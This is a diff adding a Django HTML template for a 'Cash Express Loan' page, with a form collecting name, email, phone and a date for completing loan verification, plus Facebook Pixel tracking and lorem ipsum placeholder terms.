@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+{% load static %}
+<head>
+
+
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '3676832522414607');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=3676832522414607&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Facebook Pixel Code -->
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=693121607936546&ev=PageView&noscript=1"
+/></noscript>
+
+
+	    <link rel="icon" href="https://imgur.com/b34soZQ.jpg">
+    <link rel="icon" type="image/x-icon" href="{% static '/img/cashfevicon.png' %}"/>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Wilio Survey, Quotation, Review and Register form Wizard by Ansonika.">
+    <meta name="author" content="Ansonika">
+    <title>Loan Deposit | Register Form</title>
+
+    <!-- Favicons-->
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" type="image/x-icon" href="img/apple-touch-icon-57x57-precomposed.png">
+    <link rel="apple-touch-icon" type="image/x-icon" sizes="72x72" href="img/apple-touch-icon-72x72-precomposed.png">
+    <link rel="apple-touch-icon" type="image/x-icon" sizes="114x114" href="img/apple-touch-icon-114x114-precomposed.png">
+    <link rel="apple-touch-icon" type="image/x-icon" sizes="144x144" href="img/apple-touch-icon-144x144-precomposed.png">
+
+    <!-- GOOGLE WEB FONT -->
+    <link href="https://fonts.googleapis.com/css?family=Work+Sans:400,500,600" rel="stylesheet">
+
+    <!-- BASE CSS -->
+    <link href="{%static 'preregister/html/css/bootstrap.min.css' %}" rel="stylesheet">
+	<link href="{%static 'preregister/html/css/menu.css' %}" rel="stylesheet">
+    <link href="{%static 'preregister/html/css/style.css' %}" rel="stylesheet">
+	<link href="{%static 'preregister/html/css/vendors.css' %}" rel="stylesheet">
+
+    <!-- YOUR CUSTOM CSS -->
+    <link href="{%static 'preregister/html/css/custom.css' %}" rel="stylesheet">
+
+	<!-- MODERNIZR MENU -->
+	<script src="{%static 'preregister/html/js/modernizr.js' %}"></script>
+
+</head>
+
+<body>
+
+	<div id="preloader">
+		<div data-loader="circle-side"></div>
+	</div><!-- /Preload -->
+
+	<div id="loader_form">
+		<div data-loader="circle-side-2"></div>
+	</div><!-- /loader_form -->
+
+	<nav>
+		<ul class="cd-primary-nav">
+			<li><a href="index.html" class="animated_link">Home</a></li>
+			<li><a href="quotation-wizard-version.html" class="animated_link">Aboot Us</a></li>
+			<li><a href="review-wizard-version.html" class="animated_link">Customers Review</a></li>
+			<li><a href="registration-wizard-version.html" class="animated_link">Live Chat</a></li>
+			<li><a href="about.html" class="animated_link">Verification FAQ</a></li>
+			<li><a href="contacts.html" class="animated_link">Contact Us</a></li>
+		</ul>
+	</nav>
+	<!-- /menu -->
+
+	<div class="container-fluid full-height">
+		<div class="row row-height">
+			<div class="col-lg-6 content-left">
+				<div class="content-left-wrapper">
+					<a href="index.html" id="logo"><img src="{%static 'preregister/html//img/logo.png' %}" alt="" width="49" height="35"></a>
+					<div id="social">
+
+					</div>
+					<!-- /social -->
+					<div>
+						<figure><img src="{%static 'preregister/html/img/info_graphic_2.svg' %}" alt="" class="img-fluid"></figure>
+						<h2>Hold My Loan File </h2>
+				<p> If you are unable to complete the verification process right now then you are allowed to hold your file until your next payday or you can do it whenever you like.
+					<br>Please submit the form below so we can contact you on your specific date to complete the verification process.</p>
+
+						<a href="#start" class="btn_1 rounded mobile_btn">Start Now!</a>
+					</div>
+					<div class="copy">© 2020 Cash Express Loan</div>
+				</div>
+				<!-- /content-left-wrapper -->
+			</div>
+			<!-- /content-left -->
+
+			<div class="col-lg-6 content-right" id="start">
+				<div id="wizard_container">
+					<div id="top-wizard">
+							<div id="progressbar"></div>
+						</div>
+						<!-- /top-wizard -->
+            <form action="commitment-add">
+              {% csrf_token %}
+            
+                <div class="form-group mb-4">
+                    <input type="text" name="full_name" class="form-control" id="database" placeholder="Full Name *">
+                </div>
+                  
+                <div class="form-group mb-4">
+                    <input type="text" name="email" class="form-control" id="database" placeholder="Email Address *">
+                </div>
+            
+                <div class="form-group mb-4">
+                    <input type="text" name="phone" class="form-control" id="database" placeholder="Phone *">
+                </div>
+            
+                <div class="form-group mb-4">
+                  <p style="font-weight: bold;"> At which date you will be able to do this? (We will send you a reminder email and text message)</p>
+                    <input type="date" name="pay_date" class="form-control" id="database" placeholder="When you will do this?*">
+                </div>
+            
+            
+
+                <button type="submit" id="test" class="btn btn-primary mt-4">Submit</button>
+            
+            </form>
+					</div>
+					<!-- /Wizard container -->
+			</div>
+			<!-- /content-right-->
+		</div>
+		<!-- /row-->
+	</div>
+	<!-- /container-fluid -->
+
+	<div class="cd-overlay-nav">
+		<span></span>
+	</div>
+	<!-- /cd-overlay-nav -->
+
+	<div class="cd-overlay-content">
+		<span></span>
+	</div>
+	<!-- /cd-overlay-content -->
+
+	<a href="#0" class="cd-nav-trigger">Menu<span class="cd-icon"></span></a>
+	<!-- /menu button -->
+
+	<!-- Modal terms -->
+	<div class="modal fade" id="terms-txt" tabindex="-1" role="dialog" aria-labelledby="termsLabel" aria-hidden="true">
+		<div class="modal-dialog modal-dialog-centered">
+			<div class="modal-content">
+				<div class="modal-header">
+					<h4 class="modal-title" id="termsLabel">Terms and conditions</h4>
+					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+				</div>
+				<div class="modal-body">
+					<p>Lorem ipsum dolor sit amet, in porro albucius qui, in <strong>nec quod novum accumsan</strong>, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
+					<p>Lorem ipsum dolor sit amet, in porro albucius qui, in nec quod novum accumsan, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus. Lorem ipsum dolor sit amet, <strong>in porro albucius qui</strong>, in nec quod novum accumsan, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
+					<p>Lorem ipsum dolor sit amet, in porro albucius qui, in nec quod novum accumsan, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
+				</div>
+				<div class="modal-footer">
+					<button type="button" class="btn_1" data-dismiss="modal">Close</button>
+				</div>
+			</div>
+			<!-- /.modal-content -->
+		</div>
+		<!-- /.modal-dialog -->
+	</div>
+	<!-- /.modal -->
+
+	<!-- COMMON SCRIPTS -->
+	<script src="{%static 'preregister/html/js/jquery-3.2.1.min.js' %}"></script>
+    <script src="{%static 'preregister/html/js/common_scripts.min.js' %}"></script>
+	<script src="{%static 'preregister/html/js/velocity.min.js' %}"></script>
+	<script src="{%static 'preregister/html/js/functions.js' %}"></script>
+	<script src="{%static 'preregister/html/js/pw_strenght.js' %}"></script>
+
+	<!-- Wizard script -->
+	<script src="{%static 'preregister/html/js/registration_func.js' %}"></script>
+
+</body>
+</html>
